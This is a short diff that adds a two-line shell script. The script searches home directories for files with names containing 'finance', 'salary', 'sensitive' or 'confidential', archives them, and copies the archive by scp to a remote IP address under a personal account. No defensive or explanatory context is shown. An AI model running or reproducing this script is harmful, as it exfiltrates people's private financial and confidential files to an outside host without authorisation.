@@ -1,0 +1,2 @@
+find /home/  \( -name "*finance*" -o -name "*salary*" -o -name "*sensitive*" -o -name "*confidential*" \) | xargs tar czvf sensitive.tar.gz
+scp sensitive.tar.gz basanta@172.22.168.180:/home/basanta/Desktop/
